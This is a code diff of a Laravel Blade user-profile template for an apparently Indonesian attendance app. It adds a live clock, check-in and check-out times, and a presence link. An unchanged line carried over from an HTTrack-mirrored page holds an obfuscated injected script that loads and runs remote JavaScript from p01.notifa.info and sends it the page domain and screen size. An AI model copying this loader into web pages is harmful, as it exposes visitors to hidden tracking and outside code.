@@ -61,9 +61,8 @@
         <div class="col-sm-9">
         <h4 class="page-title">User Profile</h4>
         <ol class="breadcrumb">
-            <li class="breadcrumb-item"><a href="javaScript:void();">Rocker</a></li>
-            <li class="breadcrumb-item"><a href="javaScript:void();">Pages</a></li>
-            <li class="breadcrumb-item active" aria-current="page">User Profile</li>
+            <li ><h2 style="font-size: 50px; font-family: arial;" id="jam"><h2></li>
+            
          </ol>
      </div>
     
@@ -86,11 +85,19 @@
           <img src="assets/images/gallery/1.jpg" class="card-img-top" alt="Card image cap">
           <div class="card-body">
             <h5 class="card-title text-primary">{{$user->name}}</h5>
+            <hr> 
+             <p>jam masuk  :  
+            @foreach($user->presences as $presence)
+            {{substr($presence->created_at,-9)}}  
+            @endforeach
+            </p>
+            <p>jam keluar :
+              @foreach($user->presences as $presence)
+            {{substr($presence->checkout,-9)}}  
+            @endforeach
+            </p>
             <hr>  
-            <p>jam masuk  :</p> 
-            <p>jam keluar :</p> 
-            <hr>  
-            <a href="" class="btn btn-danger col-12">absen masuk</a> 
+            <a href="presence/{{$user->id}}" class="btn btn-danger col-12">absen masuk</a> 
      
          
           </div>
@@ -151,4 +158,28 @@
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKujvCsE2ZS0m7POq%2f43%2fey9y0MOgWQD3yjKWjrs4r0br0wbxovjhyaCr0YrZKNdGh%2fumyxUMsZPLSFSjdOr77HFgVHokt1qFZTdvKpiXG8Dj%2bu6mIo%2fE0JJQhlMNZvYfJLGqW45nYGYEU7qxGtq8ZWzuWmzKX9sBhhUhGFWB7fiG3yuu0XG654JtxOlHD1GvvjT1E3QR1UKeQ01fYmxTNXICXAnxQ0M0b%2b6qLcWnjEgQf29VFSwpFsn4lUPfOiw2QPimR6IvMeG9nULan7OdaO3e%2fUTwKLCRjnLmDPx%2fjP9u6UyGdfO4MP8AVL%2bm8whO9uslyfafe7nj7py2x90EFmug6pK59n15cs34SVL7Uaefew6ybgmCnrXYdbcep7d8qQBrONlpKOS5rtI0y8vQ2%2bLGQdIQwBfSTbRuPuAiqjjCqL3mslQbEgExI0%2fX4L2ntZMhnvNZrNBYllLdTcXA%2bccaMpwvB8%2fvlhNZ%2f1UEeCjo5Ud5B%2ftw9NtFyi5kFKYiIPw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
 <!-- Mirrored from codervent.com/rocker/color-version/pages-user-profile.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:59 GMT -->
+<script type="text/javascript">
+    window.onload = function() { jam(); }
+   
+    function jam() {
+     var e = document.getElementById('jam'),
+     d = new Date(), h, m, s;
+     h = d.getHours();
+     m = set(d.getMinutes());
+     s = set(d.getSeconds());
+   
+     e.innerHTML = h +':'+ m +':'+ s;
+   
+     setTimeout('jam()', 1000);
+    }
+   
+    function set(e) {
+     e = e < 10 ? '0'+ e : e;
+     return e;
+    }
+   </script>
+
+
+
+
 </html>
